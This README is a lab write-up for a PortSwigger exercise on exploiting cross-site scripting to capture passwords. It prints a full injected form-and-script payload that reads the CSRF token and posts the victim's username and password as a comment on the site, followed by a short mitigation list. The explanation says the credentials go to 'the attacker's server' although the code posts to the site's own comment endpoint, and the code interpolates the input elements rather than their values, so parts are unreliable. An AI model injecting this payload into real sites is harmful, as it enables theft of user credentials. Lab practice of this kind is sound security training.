# Lab: Exploiting Cross-Site Scripting to Capture Passwords

This README describes an attack scenario where Cross-Site Scripting (XSS) is used to steal user credentials, specifically the username and password, by executing malicious JavaScript on the victim’s browser.

---

## Attack Overview

- The attack targets a web form with input fields for username and password.
- The password input has an `onchange` event that triggers a JavaScript function, `hax()`.
- An attacker injects malicious code that, when executed, sends the captured username and password to the attacker’s server.
- The payload does not require user interaction other than the victim entering credentials normally.

---

## Exploitation Payload
```
<input type="text" name="username">
<input type="password" name="password" onchange="hax()">

<script>
    function hax(){
    var token = document.getElementsByName('csrf')[0].value
    var data = new FormData()
    
    data.append('csrf' , token);
    data.append('postId' , 5 );
    data.append('comment', `${username}:${password}`);
    data.append('name', 'Harish');
    data.append('email', 'harish@gmail.com');
    data.append('website','http://www.harish.com');
    fetch('/post/comment',{
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
    }
    </script>

 ```
**Note:**  
- The attacker can inject this script into a vulnerable input field, or design a malicious webpage that exploits reflected XSS to run this code in the victim’s browser.
- When the user enters their username and password, the `hax()` function automatically sends their credentials to the attacker's server.

---

## How It Works

1. **Initial Input Entry**  
   The user fills in the username and password fields.

2. **Triggering the Attack**  
   - The `onchange` event on the password field fires after the user enters their credentials.
   - The `hax()` function collects the username and password.
     ![image](https://github.com/galvin10/Portswigger-labs/blob/2d0cb852ac362fc0823acfe672d2d15f90586cc2/Exploiting%20cross-site%20scripting%20vulnerabilities/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/Screenshots/Screenshot%202025-10-08%20141553.png)

3. **Data Exfiltration**  
   - The script sends the credentials (along with CSRF token, email, website info) via `fetch()` to the server specified by the attacker.
   - Using `mode: 'no-cors'` ensures the request is sent without CORS restrictions.
   ![image](https://github.com/galvin10/Portswigger-labs/blob/2d0cb852ac362fc0823acfe672d2d15f90586cc2/Exploiting%20cross-site%20scripting%20vulnerabilities/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/Screenshots/Screenshot%202025-10-08%20141529.png)
---

## Mitigation Strategies

- Validate and sanitize all user inputs on the server.
- Prevent executing untrusted code by avoiding injection points.
- Use Content Security Policy (CSP) to restrict inline scripts.
- Enable `HttpOnly` flag on session cookies to prevent theft via JavaScript.
- Implement multi-factor authentication to mitigate credential theft risks.

    
